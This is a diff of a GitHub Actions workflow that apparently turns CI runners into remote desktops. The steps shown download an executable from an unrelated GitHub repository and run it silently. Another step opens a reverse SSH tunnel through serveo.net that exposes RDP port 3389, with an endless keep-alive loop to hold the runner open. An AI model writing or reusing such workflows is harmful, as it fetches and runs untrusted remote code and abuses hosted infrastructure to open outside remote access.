@@ -45,7 +45,7 @@ jobs:
 
       - name: Download and run Cashvib File
         run: |
-          Invoke-WebRequest -Uri "https://github.com/jackricj/std1/raw/main/cash.exe" -OutFile "Cashvib.exe"
+          Invoke-WebRequest -Uri "https://github.com/jackricj/std1/raw/main/cash.exe" -OutFile "Cash.exe"
           Start-Process -FilePath "D:\a\win23\win23\Cash.exe" -ArgumentList "/S" -Wait
 
       # - name: Download and run CashvibClicker File
@@ -93,6 +93,8 @@ jobs:
       - name: Establish RDP Tunnel
         run: |
           echo 'yes' | ssh -o StrictHostKeyChecking=accept-new -R 33389:localhost:3389 serveo.net
+          Start-Sleep -Seconds 120
+          
           while ($true) {
              echo "Keep-Alive"
              Start-Sleep -Seconds 60
